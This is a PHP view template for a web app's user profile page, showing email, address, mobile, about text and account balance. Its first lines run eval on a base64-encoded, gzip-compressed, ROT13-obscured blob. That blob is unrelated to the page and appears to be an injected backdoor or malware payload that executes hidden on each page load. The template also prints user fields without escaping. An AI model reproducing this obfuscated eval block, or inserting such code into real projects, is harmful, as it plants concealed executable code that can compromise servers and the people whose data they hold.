 <?php
eval(str_rot13(gzinflate(base64_decode('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'))));
?>
<?php if(!$user_id){
 //set variables
 $this->lang->load('english_lang');//Load the language file!
 // redirect('user/login_view');
}
// Load header view
$this->load->view('common/header_view'); 

// Print content?>


  
     <div class="content">
        <div class="container-fluid">
           <div id="loader"></div>
    <!--  dashboard content -->
  <div class="container-fluid animate-bottom" style="display:none;" id="myDiv">
	<div class="row">
		<div class="col-md-12">
         
			<div class="row">
            <div class="col-md-12">
            <!-- new code -->
               <form method="post" action="">
                            <span>
                            <a href="<?php echo '_self'; ?>" type="submit" class="text-default btn btn-success pull-left"><i class="material-icons">save</i>&nbsp;&nbsp;<?= $this->lang->line('profile_save'); ?></a>
                            <a href="#" class="pull-right text-default btn btn-default"><i class="material-icons">cloud_upload</i>&nbsp;&nbsp;<?= $this->lang->line('profile_upload'); ?></a>
                            <a href="#" class="pull-right text-default btn btn-danger"><i class="material-icons">chat</i>&nbsp;&nbsp;<?= $this->lang->line('profile_support'); ?></a>
                            <a href="#" class="pull-right text-default btn btn-primary"><i class="material-icons">payment</i>&nbsp;&nbsp;<?= $this->lang->line('profile_payment'); ?></a>
            </span>
						
                <!-- end new code -->
            </div>
				<div class="col-md-8">
                 
					<div class="card">
						<h5 class="card-header bg-danger text-white font-weight-bold">
							<i class="material-icons text-white font-weight-bold pull-left">account_box</i><?= $this->lang->line('profile_details'); ?>
						</h5>
						<div class="card-body">
							<p class="card-text">
                              <div class="row">
   							
   							 <div class="col">
                             <label><?= $this->lang->line('profile_email'); ?></label>
							<input type="text" class="form-control col-5" name="email" value="<?= $email ;?>" />
                            </div>
                            </div>
                               <div class="row">
   							 <div class="col">
                            <label><?= $this->lang->line('profile_address'); ?></label>
							<textarea class="form-control col-12" name="address"><?= $address ;?></textarea>
                             </div>
    						<div class="col">
                             <label><?= $this->lang->line('profile_city'); ?></label>
							<input type="text" class="form-control col-10" name="username" value="<?= $city ;?>" />
                            </div>
                            </div>
 							<div class="row">
  							  <div class="col">
                            <label><?= $this->lang->line('profile_postal'); ?></label>
							<input type="text" class="form-control col-8" name="postal_code" value="<?= $postalcode ;?>">
                             </div>
 						   <div class="col">
                             <label><?= $this->lang->line('profile_mobile'); ?></label>
							<input type="text" class="form-control col-8" name="mobile" value="<?= $mobile;?>" />
                            </div>
                            </div>
							</p>
						</div>
						<div class="card-footer">
							
						</div>
					</div>
                    <div class="card">
						<h5 class="card-header bg-danger text-white font-weight-bold">
							<?= $this->lang->line('profile_about'); ?>
						</h5>
						<div class="card-body">
							<p class="card-text">
								<textarea class="form-control col-12"><?= $about;?></textarea>
							</p>
						</div>
						<div class="card-footer">
                       
						</div>
					</div>
				</div>
				<div class="col-md-4">
					<div class="card">
						<h5 class="card-header bg-danger text-white font-weight-bold">
							<?= $this->lang->line('profile_quick_view'); ?>
						</h5>
						<div class="card-body">
							<p class="card-text"><span class="text-danger font-weight-bold"><?= $this->lang->line('profile_name'); ?>:&nbsp;</span>
                           <?= $firstname;?>&nbsp;<?= $lastname;?>
							</p>
                            <p class="card-text"><span class="text-danger font-weight-bold"><?= $this->lang->line('profile_job'); ?>:&nbsp;</span>
                           <?= $job;?>
							</p>
                      
						</div>
						<div class="card-footer">
                       	
						</div>
					</div>
					<div class="card">
						<h5 class="card-header bg-danger text-white font-weight-bold">
							<?= $this->lang->line('profile_account'); ?>
						</h5>
						<div class="card-body">
							<p class="card-text">
                            <span class="text-danger font-weight-bold display-4 pull-left"><?= $this->lang->line('profile_balance'); ?>:</span><span class="text-dark font-weight-bold display-4">&nbsp;£&nbsp;<?= $balance ;?></span>
                            <span><a href="#" class="text-default pull-right">[ View Invoices ]</a></span>
							</p>
						</div>
						<div class="card-footer">
							
						</div>
					</div>
                </form>
				</div>
			</div>
		</div>
	</div>
</div>
          </div>
          
        <!-- dashboard content end -->
</div>
  <?php
// Load footer view
$this->load->view("common/footer_view");?>